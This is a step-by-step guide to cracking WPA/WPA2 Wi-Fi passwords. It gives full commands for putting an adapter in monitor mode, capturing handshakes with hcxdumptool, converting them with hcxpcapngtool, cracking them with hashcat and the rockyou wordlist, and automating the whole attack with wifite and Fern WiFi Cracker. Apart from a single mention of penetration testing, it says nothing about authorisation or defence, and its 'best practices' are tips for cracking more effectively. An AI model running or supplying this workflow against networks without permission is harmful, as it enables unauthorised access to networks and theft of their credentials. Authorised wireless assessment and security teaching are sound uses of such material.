# Wi-Fi Attacks and Password Cracking Guide

This document provides a practical guide to performing wireless security
assessments, capturing WPA/WPA2 handshakes, preparing captures for
cracking, and using different tools to crack Wi-Fi passwords.

------------------------------------------------------------------------

## 1. Performing Wireless Attacks

Wireless attacks are commonly used in penetration testing to evaluate
the security of Wi-Fi networks. Typical steps include: 1. Enabling
monitor mode on a wireless adapter. 2. Capturing WPA/WPA2 handshakes
during authentication. 3. Preparing the captured handshakes for
cracking. 4. Attempting password recovery with different tools.

Tools used: `aircrack-ng`, `hcxtools`, `hashcat`, `wifite`,
`fern-wifi-cracker`.

------------------------------------------------------------------------

## 2. Capturing Handshakes with hcxdumptool

`hcxdumptool` is part of **hcxtools** and is more advanced than
`airodump-ng` for capturing WPA/WPA2 handshakes.

### Install hcxdumptool

``` bash
sudo apt install hcxdumptool hcxtools
```

### Capture Handshakes

Put your adapter in monitor mode and capture handshakes:

``` bash
sudo hcxdumptool -i wlan0mon -o capture.pcapng --active_beacon --enable_status=1
```

-   `-i wlan0mon`: Your monitor mode interface.
-   `-o capture.pcapng`: Output file for captured packets.
-   `--active_beacon`: Actively send beacons to clients.
-   `--enable_status=1`: Display status information.

Stop capturing once you have enough handshakes.

------------------------------------------------------------------------

## 3. Preparing Captured Handshakes for Cracking

`hcxpcapngtool` converts `.pcapng` files into a format suitable for
cracking with hashcat.

``` bash
hcxpcapngtool -o handshake.22000 -E wordlist.txt capture.pcapng
```

-   `-o handshake.22000`: Output file in hashcat format.
-   `-E wordlist.txt`: Extracts potential wordlist candidates from
    ESSIDs.

------------------------------------------------------------------------

## 4. Cracking Wi-Fi Passwords with Hashcat

`hashcat` is a GPU-accelerated password recovery tool.

### Example Command

``` bash
hashcat -m 22000 handshake.22000 /usr/share/wordlists/rockyou.txt --force
```

-   `-m 22000`: WPA/WPA2 hash mode.
-   `handshake.22000`: Input handshake file.
-   `rockyou.txt`: Example wordlist.

Hashcat will attempt to crack the key; if successful, it will display:

    <network-SSID>:<password>

------------------------------------------------------------------------

## 5. Automated Wi-Fi Cracking with Wifite

`wifite` automates the entire Wi-Fi cracking workflow.

### Install Wifite

``` bash
sudo apt install wifite
```

### Run Wifite

``` bash
sudo wifite
```

-   Automatically scans networks.
-   Captures handshakes.
-   Runs cracking attempts using available wordlists and tools.

This tool is useful for rapid assessments.

------------------------------------------------------------------------

## 6. Cracking Wi-Fi Passwords with Fern WiFi Cracker

**Fern WiFi Cracker** provides a GUI for Wi-Fi attacks.

### Install Fern

``` bash
sudo apt install fern-wifi-cracker
```

### Usage

1.  Launch: `sudo fern-wifi-cracker`
2.  Select your wireless interface.
3.  Scan for networks.
4.  Select a target network.
5.  Fern captures handshakes and attempts to crack them with internal or
    external wordlists.

------------------------------------------------------------------------

## 7. Best Practices

-   Always use a supported adapter (Atheros/Alfa recommended).
-   Capture complete WPA/WPA2 four-way handshakes.
-   Use strong, targeted wordlists.
-   Prefer GPU-accelerated cracking with hashcat for speed.
-   Automate with wifite or fern for convenience.

------------------------------------------------------------------------

## Summary

1.  Use `hcxdumptool` to capture handshakes.
2.  Convert with `hcxpcapngtool` for hashcat.
3.  Crack with `hashcat` using strong wordlists.
4.  Automate with `wifite` or use GUI via `fern-wifi-cracker`.

✅ This workflow provides multiple approaches for Wi-Fi penetration
testing and password recovery.
